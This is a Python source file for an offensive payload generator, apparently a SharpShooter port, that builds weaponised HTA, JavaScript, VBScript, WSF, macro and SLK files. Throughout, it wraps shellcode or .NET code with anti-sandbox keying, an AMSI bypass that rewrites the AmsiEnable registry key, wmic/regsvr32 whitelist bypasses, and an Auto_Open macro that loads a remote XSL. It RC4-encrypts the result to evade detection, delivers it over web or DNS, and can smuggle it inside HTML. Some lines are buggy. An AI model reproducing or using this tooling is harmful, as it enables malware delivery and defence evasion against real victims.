#!/usr/bin/env python3


# Built-in imports
import base64
import gzip
import random
import re
import argparse
import sys
import string
from io import BytesIO
from colorama import Fore
from pathlib import Path
from typing import Union

# Third party library imports
from jsmin import jsmin

# Local library imports
from supersharpshooter.modules import *
from supersharpshooter.modules.defender import fix_hardcode


BRED = Fore.LIGHTRED_EX
BGREEN = Fore.LIGHTGREEN_EX
BBLUE = Fore.LIGHTBLUE_EX
BYELLOW = Fore.LIGHTYELLOW_EX
RESET = Fore.RESET


CURRENT_PATH = Path(__file__).resolve().parent
TEMPLATES_DIR = CURRENT_PATH / "templates"


def read_file(file_path) -> str:
    return Path(file_path).expanduser().resolve().read_text(encoding="utf-8")


def read_file_binary(file_path):
    return Path(file_path).expanduser().resolve().read_bytes()


def print_bad(st, err=None, pre=""):
    print(f"%s{BRED}[*]{RESET} %s" % (pre, st))
    if not err == None:
        print(str(err))
    sys.exit(-1)


def print_warn(st):
    print(f"{BYELLOW}[!]{RESET} %s" % st)


def print_msg(st):
    print(f"{BBLUE}[*]{RESET} %s" % st)


def ret_good_arb(arb, st):
    return f"\n{BGREEN}%s{RESET} %s" % (arb, st)


def banner() -> None:
    banner = f"""
             _____ __                    _____ __                __
            / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
            \__ \/ __ \/ __ `/ ___/ __ \\\\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
           ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /
     {BRED}SUPER{RESET}/____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/
                              /_/
"""
    print(banner)


def rand_key(n):
    return "".join([random.choice(string.ascii_lowercase) for _ in range(n)])


def gzip_str(string_: Union[str, bytes]) -> bytes:
    # Initialize a BytesIO object
    fgz = BytesIO()

    # Ensure the input is in bytes
    if isinstance(string_, str):
        string_ = string_.encode("utf-8")

    # Use a context manager to handle the gzip file
    with gzip.GzipFile(mode="wb", fileobj=fgz) as gzip_obj:
        gzip_obj.write(string_)

    # Get the value of the BytesIO buffer
    return fgz.getvalue()


def rc4(key: Union[str, bytes], data: Union[str, bytes]) -> bytes:
    if isinstance(key, str):
        key = key.encode("utf-8")
    if isinstance(data, str):
        data = data.encode("utf-8")

    # Initialization of the key schedule
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    # Generation of the keystream and ciphertext
    i = j = 0
    output = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        output.append(byte ^ S[(S[i] + S[j]) % 256])

    return bytes(output)


def console() -> None:
    banner()

    antisandbox = ret_good_arb("[1]", "Key to Domain (e.g. 1=CONTOSO)")
    antisandbox += ret_good_arb("[2]", "Ensure Domain Joined")
    antisandbox += ret_good_arb("[3]", "Check for Sandbox Artifacts")
    antisandbox += ret_good_arb("[4]", "Check for Bad MACs")
    antisandbox += ret_good_arb("[5]", "Check for Debugging")

    parser = argparse.ArgumentParser(
        prog="supersharpshooter",
        add_help=True,
    )

    parser.add_argument(
        "--stageless", action="store_true", help="Create a stageless payload"
    )
    parser.add_argument(
        "--dotnetver",
        metavar="<ver>",
        dest="dotnetver",
        default=None,
        help="Target .NET Version: 2 or 4",
    )
    parser.add_argument(
        "--com",
        metavar="<com>",
        dest="comtechnique",
        default=None,
        help="COM Staging Technique: outlook, shellbrowserwin, wmi, wscript, xslremote",
    )
    parser.add_argument(
        "--awl",
        metavar="<awl>",
        dest="awltechnique",
        default=None,
        help="Application Whitelist Bypass Technique: wmic, regsvr32",
    )
    parser.add_argument(
        "--awlurl",
        metavar="<awlurl>",
        dest="awlurl",
        default=None,
        help="URL to retrieve XSL/SCT payload",
    )
    parser.add_argument(
        "--payload",
        metavar="<format>",
        dest="payload",
        default=None,
        help="Payload type: hta, js, jse, vbe, vbs, wsf, macro, slk",
    )
    parser.add_argument(
        "--sandbox",
        metavar="<types>",
        dest="sandbox",
        default=None,
        help="Anti-sandbox techniques: " + antisandbox,
    )
    parser.add_argument(
        "--amsi",
        metavar="<amsi>",
        dest="amsi",
        default=None,
        help="Use amsi bypass technique: amsienable",
    )
    parser.add_argument(
        "--delivery",
        metavar="<type>",
        dest="delivery",
        default=None,
        help="Delivery method: web, dns, both",
    )
    parser.add_argument(
        "--rawscfile",
        metavar="<path>",
        dest="rawscfile",
        default=None,
        help="Path to raw shellcode file for stageless payloads",
    )
    parser.add_argument(
        "--shellcode", action="store_true", help="Use built in shellcode execution"
    )
    parser.add_argument(
        "--scfile",
        metavar="<path>",
        dest="shellcode_file",
        default=None,
        help="Path to shellcode file as CSharp byte array",
    )
    parser.add_argument(
        "--refs",
        metavar="<refs>",
        dest="refs",
        default=None,
        help="References required to compile custom CSharp,\ne.g. mscorlib.dll,System.Windows.Forms.dll",
    )
    parser.add_argument(
        "--namespace",
        metavar="<ns>",
        dest="namespace",
        default=None,
        help="Namespace for custom CSharp,\ne.g. Foo.bar",
    )
    parser.add_argument(
        "--entrypoint",
        metavar="<ep>",
        dest="entrypoint",
        default=None,
        help="Method to execute,\ne.g. Main",
    )
    parser.add_argument(
        "--web",
        metavar="<web>",
        dest="web",
        default=None,
        help="URI for web delivery",
    )
    parser.add_argument(
        "--dns",
        metavar="<dns>",
        dest="dns",
        default=None,
        help="Domain for DNS delivery",
    )
    parser.add_argument(
        "--output",
        metavar="<output>",
        dest="output",
        default=None,
        help="Name of output file (e.g. maldoc)",
    )
    parser.add_argument(
        "--smuggle", action="store_true", help="Smuggle file inside HTML"
    )
    parser.add_argument(
        "--template",
        metavar="<tpl>",
        dest="template",
        default=None,
        help="Name of template file (e.g. mcafee)",
    )

    args = parser.parse_args()

    if not args.dotnetver and not args.payload == "slk":
        print_bad("Missing --dotnetver argument")
    else:
        if not args.payload == "slk":
            try:
                dotnetver = int(args.dotnetver)
                if not dotnetver in [2, 4]:
                    raise Exception("Only versions 2, 4 supported")
            except Exception as e:
                print_bad("Invalid .NET version", e)

    if not args.payload:
        print_bad("Missing --payload argument")
    if not args.delivery and not args.stageless and not args.payload == "slk":
        print_bad("Missing --delivery argument")
    if not args.output:
        print_bad("Missing --output argument")

    if (args.stageless) and (args.delivery or args.dns or args.web):
        print_bad("Stageless payloads are not compatible with delivery arguments")

    if args.delivery == "both":
        if not args.web or not args.dns:
            print_bad("Missing --web and --dns arguments")
    elif args.delivery == "web":
        if not args.web:
            print_bad("Missing --web arguments")
    elif args.delivery == "dns":
        if not args.dns:
            print_bad("Missing --dns arguments")
    elif args.delivery:
        print_bad("Invalid delivery method")

    if not args.shellcode and not args.stageless and not args.payload == "slk":
        if not args.refs or not args.namespace or not args.entrypoint:
            print_bad(
                "Custom CSharp selected, --refs, --namespace and --entrypoint arguments required"
            )
    else:
        if not args.shellcode_file and not args.stageless and not args.payload == "slk":
            print_bad("Built-in CSharp template selected, --scfile argument required")

    if args.stageless and not args.rawscfile:
        print_bad("Stageless payloads require the --rawscfile argument")

    if args.smuggle:
        if not args.template:
            print_bad("Template name required when smuggling")

    if args.comtechnique:
        if not args.awlurl:
            print_bad(" --awlurl required when COM staging")

    if args.payload == "macro" and args.smuggle:
        print_bad("Macro payload cannot be smuggled")

    if args.payload == "macro" and not args.comtechnique == "xslremote":
        print_bad("Macro payload requires the --com xsmlremote and --awlurl arguments")

    if args.payload == "slk" and args.comtechnique:
        print_bad("SLK payloads do not currently support COM staging")

    if args.payload == "slk":
        print_bad("Shellcode must not contain null bytes")

    def set_types(
        extension: str, code_type: str, file_type: str, base_path: Path
    ) -> tuple:
        if not extension.startswith("."):
            extension = f".{extension}"
        template_path = base_path.with_suffix(base_path.suffix + extension)
        template_body = read_file(template_path)
        return template_body, code_type, file_type

    template_body = ""
    template_base = TEMPLATES_DIR / "sharpshooter"
    shellcode_delivery = False
    shellcode_gzip = ""
    payload_type = 0
    dotnet_version = 1
    stageless_payload = False

    PTYPES = {
        "hta": 1,
        "js": 2,
        "jse": 3,
        "vba": 4,
        "vbe": 5,
        "vbs": 6,
        "wsf": 7,
        "macro": 8,
        "slk": 9,
    }

    payload_type = PTYPES[args.payload] if args.payload in PTYPES.keys() else 0
    sandbox_techniques = ""
    techniques_list = []
    sandboxevasion_type = 0

    macro_template = """	Set XML = CreateObject("Microsoft.XMLDOM")
XML.async = False
Set xsl = XML
xsl.Load "%s"
XML.transformNode xsl""" % (
        args.awlurl
    )

    macro_amsi_stub = """	regpath = "HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable"
Set oWSS = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")
e = 0
On Error Resume Next
r = oWSS.RegRead(regpath)
If r <> 0 Then
    oWSS.RegWrite regpath, "0", "REG_DWORD"
    e = 1
End If

If Err.Number <> 0 Then
    oWSS.RegWrite regpath, "0", "REG_DWORD"
    e = 1
Err.Clear
End If

%s

If e Then
    oWSS.RegWrite regpath, "1", "REG_DWORD"
End If

On Error GoTo 0""" % (
        macro_template
    )

    macro_stager = """Sub Auto_Open()
%MACRO_CODE%
End Sub"""

    if args.amsi and args.payload == "macro":
        macro_stager = macro_stager.replace("%MACRO_CODE%", macro_amsi_stub)
    else:
        macro_stager = macro_stager.replace("%MACRO_CODE%", macro_template)

    if not args.payload == "slk":
        dotnet_version = int(args.dotnetver)

        if (args.stageless or stageless_payload is True) and dotnet_version == 2:
            template_base = TEMPLATES_DIR / "stageless"
        elif (args.stageless or stageless_payload is True) and dotnet_version == 4:
            template_base = TEMPLATES_DIR / "stagelessv4"
        elif dotnet_version == 4:
            template_base = TEMPLATES_DIR / "sharpshooterv4"

    try:
        if payload_type < 1:
            raise Exception("Selected payload_type not one of avaialable types")

        if payload_type == 1:
            if args.comtechnique:
                template_body, code_type, file_type = set_types(
                    "js", "js", "hta", template_base
                )
            else:
                template_body, code_type, file_type = set_types(
                    "vbs", "vbs", "hta", template_base
                )
        elif payload_type == 2:
            template_body, code_type, file_type = set_types(
                "js", "js", "js", template_base
            )
        elif payload_type == 3:
            template_body, code_type, file_type = set_types(
                "js", "js", "js", template_base
            )
        elif payload_type == 4:
            print_warn("VBA support is still under development")
            raise Exception
            # template_body = read_file(template_base + "vba")
            # file_type = "vba"
        elif payload_type == 5:
            if args.comtechnique:
                template_body, code_type, file_type = set_types(
                    "js", "js", "vbs", template_base
                )
            else:
                template_body, code_type, file_type = set_types(
                    "vbs", "vbs", "vbs", template_base
                )
        elif payload_type == 6:
            if args.comtechnique:
                template_body, code_type, file_type = set_types(
                    "js", "js", "vbs", template_base
                )
            else:
                template_body, code_type, file_type = set_types(
                    "vbs", "vbs", "vbs", template_base
                )
        elif payload_type == 7:
            template_body, code_type, file_type = set_types(
                "js", "js", "wsf", template_base
            )
        elif payload_type == 8:
            template_body, code_type, file_type = set_types(
                "js", "js", "macro", template_base
            )
        elif payload_type == 9:
            file_type = "slk"
    except Exception as e:
        print_bad("Incorrect choice", e, "\n")

    if args.sandbox:
        techniques_list = args.sandbosplit(",")

    while True:
        if techniques_list:
            sandboxevasion_type = techniques_list[0]
            techniques_list.remove(techniques_list[0])
            if not sandboxevasion_type:
                sandboxevasion_type = "0"
        else:
            sandboxevasion_type = "0"

        try:
            if "1" in sandboxevasion_type:
                domainkey = sandboxevasion_type.split("=")
                domain_name = domainkey[1]
                sandboxevasion_type = domainkey[0]

            sandboxevasion_type = int(sandboxevasion_type)
            if sandboxevasion_type > 5:
                raise Exception(
                    "Sandbox Evasion type not in range of acceptable options"
                )

            if sandboxevasion_type == 1:
                domain_name = domain_name.strip()

                if not domain_name:
                    raise Exception("Missing domain_name")

                if len(domain_name) <= 1:
                    raise Exception("domain_name length too short")
                else:
                    print_msg("Adding keying for %s domain" % (domain_name))
                    if "js" in file_type or args.comtechnique:
                        sandbox_techniques += '\to.CheckPlease(0, "%s")\n' % domain_name
                    else:
                        sandbox_techniques += 'o.CheckPlease 0, "%s"\n' % domain_name
                    continue
            elif sandboxevasion_type == 2:
                print_msg("Keying to domain joined systems")
                if "js" in file_type or args.comtechnique:
                    sandbox_techniques += '\to.CheckPlease(1,"foo")\n'
                else:
                    sandbox_techniques += 'o.CheckPlease 1, "foo"\n'
                continue
            elif sandboxevasion_type == 3:
                print_msg("Avoiding sandbox artifacts")

                if "js" in file_type or args.comtechnique:
                    sandbox_techniques += '\to.CheckPlease(2,"foo")\n'
                else:
                    sandbox_techniques += 'o.CheckPlease 2,"foo"\n'
                continue
            elif sandboxevasion_type == 4:
                print_msg("Avoiding bad MACs")

                if "js" in file_type or args.comtechnique:
                    sandbox_techniques += '\to.CheckPlease(3,"foo")\n'
                else:
                    sandbox_techniques += 'o.CheckPlease 3,"foo"\n'
                continue
            elif sandboxevasion_type == 5:
                print_msg("Avoiding debugging")

                if "js" in file_type or args.comtechnique:
                    sandbox_techniques += '\to.CheckPlease(4,"foo")\n'
                else:
                    sandbox_techniques += 'o.CheckPlease 4,"foo"\n'
                continue
            elif sandboxevasion_type == 0:
                break

        except Exception as e:
            print_bad("Incorrect choice", e, "\n")

    template_code = template_body.replace("%SANDBOX_ESCAPES%", sandbox_techniques)

    delivery_method = "1"
    encoded_sc = ""
    while True:

        if args.delivery == "web":
            delivery_method = "1"
        elif args.delivery == "dns":
            delivery_method = "2"
        else:
            delivery_method = "3"

        try:
            delivery_method = int(delivery_method)

            shellcode_payload = True if args.shellcode else False

            if shellcode_payload:
                shellcode_delivery = True
                shellcode_template = read_file(TEMPLATES_DIR / "shellcode.cs")

                shellcode = []

                sc = read_file(args.shellcode_file)
                sc = re.sub("(byte\[\] buf.*{|};|\\n)", "", sc)
                shellcode.append(sc)

                shellcode = "\n".join(shellcode)

                shellcode_final = shellcode_template.replace("%SHELLCODE%", shellcode)
                # print(shellcode_final)
                shellcode_gzip = gzip_str(shellcode_final)

            elif args.stageless or stageless_payload is True:
                rawsc = read_file_binary(args.rawscfile)
                encoded_sc = base64.b64encode(rawsc)
                # if("vbs" in file_type or "hta" in file_type):
                # 	sc_split = [encoded_sc[i:i+100] for i in range(0, len(encoded_sc), 100)]
                # 	for i in sc_split:
                # else:
                template_code = template_code.replace(
                    "%SHELLCODE64%", str(encoded_sc, "utf-8")
                )

            else:
                refs = args.refs
                namespace = args.namespace
                entrypoint = args.entrypoint

            if shellcode_delivery:
                refs = "mscorlib.dll"
                namespace = "ShellcodeInjection.Program"
                entrypoint = "Main"

            if delivery_method == 1 and not stageless_payload:
                ## WEB
                stager = args.web

                if "js" in file_type or "wsf" in file_type or args.comtechnique:
                    template_code = template_code.replace(
                        "%DELIVERY%",
                        'o.Go("%s", "%s", "%s", 1, "%s");'
                        % (refs, namespace, entrypoint, stager),
                    )
                else:
                    template_code = template_code.replace(
                        "%DELIVERY%",
                        'o.Go "%s", "%s", "%s", 1, "%s"'
                        % (refs, namespace, entrypoint, stager),
                    )

            if delivery_method == 2 and not stageless_payload:
                ## DNS
                stager = args.dns

                if "js" in file_type or "wsf" in file_type or args.comtechnique:
                    template_code = template_code.replace(
                        "%DELIVERY%",
                        '\to.Go("%s", "%s", "%s", 2, "%s");'
                        % (refs, namespace, entrypoint, stager),
                    )
                else:
                    template_code = template_code.replace(
                        "%DELIVERY%",
                        '\to.Go "%s", "%s", "%s", 2, "%s"'
                        % (refs, namespace, entrypoint, stager),
                    )

            if (
                (delivery_method == 3)
                and (not args.stageless)
                and (not stageless_payload)
            ):
                stager = args.web

                if "js" in file_type or "wsf" in file_type or args.comtechnique:
                    webdelivery = '\to.Go("%s", "%s", "%s", 1, "%s");\n' % (
                        refs,
                        namespace,
                        entrypoint,
                        stager,
                    )
                else:
                    webdelivery = '\to.Go "%s", "%s", "%s", 1, "%s"\n' % (
                        refs,
                        namespace,
                        entrypoint,
                        stager,
                    )

                stager = args.dns

                if "js" in file_type or "wsf" in file_type or args.comtechnique:
                    dnsdelivery = '\to.Go("%s", "%s", "%s", 2, "%s");' % (
                        refs,
                        namespace,
                        entrypoint,
                        stager,
                    )
                else:
                    dnsdelivery = '\to.Go "%s", "%s", "%s", 2, "%s"' % (
                        refs,
                        namespace,
                        entrypoint,
                        stager,
                    )

                deliverycode = webdelivery + dnsdelivery
                template_code = template_code.replace("%DELIVERY%", deliverycode)

            break
        except Exception as e:
            print_bad("Incorrect choice", e, "\n")

    amsi_bypass = ""
    outputfile = args.output
    outputfile_payload = outputfile + "." + file_type

    if args.amsi and not args.payload == "macro":
        if args.comtechnique:
            amsi_bypass = amsikiller.amsi_stub("js", args.amsi, outputfile_payload)
            template_code = amsi_bypass + template_code + "}"
        else:
            amsi_bypass = amsikiller.amsi_stub(code_type, args.amsi, outputfile_payload)

            if file_type in ["vbs", "vba", "hta"]:
                template_code = amsi_bypass + template_code + "\nOn Error Goto 0\n"
            else:
                template_code = amsi_bypass + template_code + "}"

    # print(template_code)

    key = rand_key(32)
    template_code = fix_hardcode(template_code, code_type)
    payload_encrypted = rc4(key, template_code)
    payload_encoded = base64.b64encode(payload_encrypted)

    awl_payload_simple = ""

    if "js" in file_type or args.comtechnique:
        harness = read_file(TEMPLATES_DIR / "harness.js")
        payload = harness.replace("%B64PAYLOAD%", str(payload_encoded, "utf-8"))
        payload = payload.replace("%KEY%", "'%s'" % (key))
        payload_minified = jsmin(payload)
        awl_payload_simple = template_code
    elif "wsf" in file_type:
        harness = read_file(TEMPLATES_DIR / "harness.wsf")
        payload = harness.replace("%B64PAYLOAD%", str(payload_encoded, "utf-8"))
        payload = payload.replace("%KEY%", "'%s'" % (key))
        payload_minified = jsmin(payload)
    elif "hta" in file_type:
        harness = read_file(TEMPLATES_DIR / "harness.hta")
        payload = harness.replace("%B64PAYLOAD%", str(payload_encoded, "utf-8"))
        payload = payload.replace("%KEY%", "'%s'" % (key))
        payload_minified = jsmin(payload)
    elif "vba" in file_type:
        harness = read_file(TEMPLATES_DIR / "harness.vba")
        payload = harness.replace("%B64PAYLOAD%", str(payload_encoded, "utf-8"))
        payload = payload.replace("%KEY%", '"%s"' % (key))
        payload_minified = jsmin(payload)
    elif "slk" in file_type:
        pass
    else:
        harness = read_file(TEMPLATES_DIR / "harness.vbs")
        payload = harness.replace("%B64PAYLOAD%", str(payload_encoded, "utf-8"))
        payload = payload.replace("%KEY%", '"%s"' % (key))
        # print(payload)

    if payload_type == 3:
        file_type = "jse"
    elif payload_type == 5:
        file_type = "vbe"

    f = open(outputfile_payload, "wb")
    # print(payload)
    if payload_type == 8:
        f.write(str(macro_stager), "utf-8")

    if payload_type == 9:
        payload = excel4.generate_slk(args.rawscfile)

    if args.comtechnique:
        if not args.awltechnique or args.awltechnique == "wmic":
            payload_file = outputfile + ".xsl"
        else:
            payload_file = outputfile + ".sct"

        # if("js" in file_type or "hta" in file_type or "wsf" in file_type):
        awl_payload = awl.create_com_stager(
            args.comtechnique,
            file_type,
            args.awlurl,
            payload_file,
            awl_payload_simple,
            args.amsi,
        )
        # else:
        # 	awl_payload = awl.create_com_stager(args.comtechnique, file_type, args.awlurl, payload_file, payload)
        f.write(awl_payload.encode("utf-8"))
    elif file_type in ["js", "hta", "wsf"]:
        f.write(payload_minified.encode("utf-8"))
    else:
        f.write(payload.encode("utf-8"))
    f.close()

    if shellcode_delivery:
        print_msg(
            f"File {outputfile_payload} successfully created!\n\t  ^^ Selected delivery method will deliver this"
        )
        outputfile_shellcode = outputfile + ".payload"
        with open(outputfile_shellcode, "wb") as f:
            gzip_encoded = base64.b64encode(shellcode_gzip.getvalue())
            f.write(gzip_encoded)
            f.close()
            print_msg(
                f"{outputfile_shellcode} successfully created!... \n\t  ^^ Selected delivery method expects this at: {args.web}"
            )
    else:
        print_msg("Written delivery payload to %s" % outputfile_payload)

    if not file_type in ["vba"]:
        if args.smuggle:
            key = rand_key(32)
            template = ""
            template = args.template
            embedinhtml.run_embedInHtml(
                key,
                outputfile_payload,
                outputfile + ".html",
                template,
            )
